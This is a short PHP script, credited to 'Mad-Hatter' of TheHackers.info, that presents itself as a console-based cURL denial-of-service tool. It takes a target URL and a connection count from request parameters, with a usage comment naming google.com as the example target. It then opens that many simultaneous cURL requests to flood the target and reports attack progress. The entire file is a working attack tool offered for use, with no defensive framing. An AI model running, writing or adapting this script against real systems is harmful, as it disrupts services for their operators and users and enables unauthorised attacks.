<?php
     //Consol Based CURL Dos
    //   By: Mad-Hatter 
   //               TheHackers.info
  //use ?x=9000&target=google.com
 // Target = Target
// x = Connections
///////////////////////////////////

function MakeArrays($count, $url)
{
  echo "[+] Preparing Arrays\n";
  $victim = array();
   for($x = 0; $x <= $count; $x++)
   {
     $victim[$x] = $url; 
   }
   echo "[+] DONE Preparing Arrays ({$count})\n";
   return $victim;
}

if(!isset($_REQUEST['target']) || empty($_REQUEST['target']))
 die("[-] ***** go back and put in valid params.\n");

$victim = MakeArrays(trim($_REQUEST['x']), trim($_REQUEST['target']));

echo "[+] Preparing cURL
";
$mh = curl_multi_init();

foreach ($victim as $i => $url)
{
       $c[$i] = curl_init($url);
       curl_setopt($c[$i], CURLOPT_RETURNTRANSFER, 1);
       curl_multi_add_handle($mh, $c[$i]);
}
echo "[+] DONE Preparing cURL 
";
echo "[+] Starting cURL Attacks 
";
do 
{
  $n = curl_multi_exec($mh, $active); 
} while ($active);
echo "[+] Attacks Completed 
";
echo "[+] Waiting for Server buffer. 
";
foreach ($victim as $i => $url)
{
       $res[$i]=curl_multi_getcontent($c[$i]);
       curl_close($c[$i]);
}
echo "[+] DoS done?\n";

?>
